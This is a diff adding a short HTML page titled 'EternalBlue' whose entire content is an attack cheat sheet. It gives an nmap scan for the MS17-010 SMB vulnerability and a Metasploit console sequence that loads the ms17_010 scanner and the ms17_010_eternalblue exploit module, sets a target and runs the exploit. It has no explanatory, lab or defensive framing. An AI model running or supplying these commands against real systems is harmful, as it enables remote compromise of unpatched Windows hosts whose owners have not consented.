@@ -1,0 +1,21 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>EternalBlue</title>
+</head><body><span style="font-size: 13pt"><br/>
+nmap -p445 --script smb-vuln-ms17-010 &lt;target&gt; &nbsp;<br/>
+<br/>
+msf &gt; use auxiliary/scanner/smb/smb_ms17_010 msf auxiliary(smb_ms17_010) &gt; <br/>
+msf auxiliary(smb_ms17_010) &gt; <br/>
+set ACTION &lt; action-name &gt; <br/>
+msf auxiliary(smb_ms17_010) &gt; <br/>
+msf auxiliary(smb_ms17_010) &gt; run<br/>
+<br/>
+msf &gt; use exploit/windows/smb/ms17_010_eternalblue<br/>
+msf exploit(ms17_010_eternalblue) &gt; show targets<br/>
+msf exploit(ms17_010_eternalblue) &gt; set TARGET &lt; target-id &gt;<br/>
+msf exploit(ms17_010_eternalblue) &gt; show options<br/>
+msf exploit(ms17_010_eternalblue) &gt; exploit<br/>
+<br/>
+</span></body></html>
